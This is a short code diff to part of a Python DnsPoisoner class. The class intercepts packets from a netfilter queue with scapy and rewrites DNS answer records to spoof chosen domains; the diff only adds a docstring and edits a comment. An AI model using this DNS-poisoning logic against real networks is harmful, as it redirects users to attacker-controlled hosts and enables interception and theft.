@@ -23,11 +23,11 @@ class DnsPoisoner(multiprocessing.Process):
         self.urls_to_spoof[url] = ip
 
     def handle_packet(self, packet_nfqueue):
-
+        """Handles each packet in the queue by editing them if neccessary."""
         packet_scapy = IP(packet_nfqueue.get_payload())    #converts the raw packet to a scapy compatible string
         
         if packet_scapy.haslayer(DNSRR):
-            packet_scapy = self.edit_dnsrr(packet_scapy)    #edit packet
+            packet_scapy = self.edit_dnsrr(packet_scapy)    #edit packet for spoof
             packet_nfqueue.set_payload(bytes(packet_scapy))    #converts scapy compatible string back to raw packet
 
         packet_nfqueue.accept()    #accept the packet and release it back into the wild
